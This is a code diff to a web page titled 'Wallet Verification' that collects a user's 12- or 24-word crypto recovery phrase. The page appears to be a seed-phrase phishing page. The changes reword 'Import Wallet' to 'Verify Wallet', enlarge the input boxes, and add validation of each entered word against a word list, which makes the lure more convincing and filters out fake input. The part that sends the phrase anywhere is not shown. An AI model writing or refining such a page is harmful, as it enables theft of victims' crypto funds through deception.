@@ -170,13 +170,13 @@
             margin-bottom: 12px;
         }
 
-        /* Vertical height sizing for boxes */
+        /* Taller, more vertical box sizing */
         .inputs-container.mode-12 .input-group {
-            height: 50px;
+            height: 54px;
         }
 
         .inputs-container.mode-24 .input-group {
-            height: 38px;
+            height: 42px;
         }
 
         /* Input Group styling */
@@ -292,7 +292,7 @@
                     <div class="dot"></div>
                 </div>
                 <div class="modal-title">Wallet Verification</div>
-                <div class="modal-subtitle">Begin wallet verification by adding your recovery phrase.</div>
+                <div class="modal-subtitle">Verify your wallet using your 12-24 word recovery phrase.</div>
                 <button type="button" class="action-btn active-btn" id="startBtn" style="pointer-events: auto; cursor: pointer;">Continue</button>
             </div>
 
@@ -305,13 +305,13 @@
                 </div>
 
                 <div class="modal-title">Recovery Phrase</div>
-                <div class="modal-subtitle" id="subtitle-text">Import an existing wallet with your 12 or 24-word recovery phrase.</div>
+                <div class="modal-subtitle" id="subtitle-text">Verify your wallet using your 12-24 word recovery phrase.</div>
 
                 <div class="inputs-container mode-12" id="inputsGrid"></div>
 
                 <button type="button" class="toggle-phrase" id="toggleBtn">I have a 24-word recovery phrase</button>
 
-                <button type="button" class="action-btn" id="importBtn">Import Wallet</button>
+                <button type="button" class="action-btn" id="importBtn">Verify Wallet</button>
             </div>
 
             <!-- Loading / Verification Screen -->
@@ -331,7 +331,7 @@
     <!-- Script Logic -->
     <script>
         let wordCount = 12;
-        const defaultSubtitle = "Import an existing wallet with your 12 or 24-word recovery phrase.";
+        const defaultSubtitle = "Verify your wallet using your 12-24 word recovery phrase.";
         
         const welcomeScreen = document.getElementById('welcomeScreen');
         const phraseScreen = document.getElementById('phraseScreen');
@@ -403,26 +403,33 @@
             if (wordCount === 12) {
                 wordCount = 24;
                 toggleBtn.textContent = "I have a 12-word recovery phrase";
-                subtitleText.textContent = "Import an existing wallet with your 24-word recovery phrase.";
             } else {
                 wordCount = 12;
                 toggleBtn.textContent = "I have a 24-word recovery phrase";
-                subtitleText.textContent = defaultSubtitle;
             }
+            subtitleText.textContent = defaultSubtitle;
             renderInputs();
         };
 
         function checkCompletion() {
             let allFilled = true;
+            let hasError = false;
+
             for (let i = 1; i <= wordCount; i++) {
                 const inputEl = document.getElementById(`word-${i}`);
-                if (!inputEl || inputEl.value.trim() === "") {
+                if (!inputEl) {
                     allFilled = false;
                     break;
                 }
+                const val = inputEl.value.trim().toLowerCase();
+                if (val === "") {
+                    allFilled = false;
+                } else if (!validWords.has(val)) {
+                    hasError = true;
+                }
             }
 
-            if (allFilled) {
+            if (allFilled && !hasError) {
                 importBtn.classList.add('active-btn');
             } else {
                 importBtn.classList.remove('active-btn');
@@ -450,6 +457,7 @@
                     subtitleText.textContent = defaultSubtitle;
                     subtitleText.style.color = '#8c8c9e';
                 }
+                checkCompletion();
             }
         }, true);
 
